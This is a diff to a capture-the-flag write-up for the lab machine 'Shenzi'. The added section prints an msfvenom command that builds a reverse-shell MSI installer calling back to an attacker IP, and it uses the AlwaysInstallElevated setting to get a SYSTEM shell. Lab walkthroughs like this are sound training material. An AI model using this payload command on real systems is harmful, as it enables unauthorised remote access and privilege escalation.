@@ -1,4 +1,4 @@
-## First enumeration with nmap 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6a139e8d-6e50-48fe-83ba-fb4eb6adebc5)## First enumeration with nmap 
 
 ```shell
 # Nmap 7.94SVN scan initiated Fri Mar  8 01:20:45 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 21,80,135,139,443,445,3306,7680 -Pn 192.168.197.55
@@ -119,7 +119,25 @@ running winpeas.exe, we can see `AlwaysInstallElevated` is enabled.
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d76540df-46bb-427b-8101-ec8a4320577d)
 
-tried it manually to confirm. we can see it is available.
+tried it manually to confirm. we can see it is available. let's exploit this
 
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Shenzi]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=443 -f msi -o reverse.msi
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+Saved as: reverse.msi
+```
+first we create a microsoft installer payload reverse shell. 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0926401c-7d92-47e9-8e13-c72f1b88b13c)
+
+next we install the payload and boom we got a reverse shell as `nt authority/system`.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c590efa2-9c14-468b-8a44-bc1e36acdd8e)
+
+And we are through. 🙂 easy huh 
 
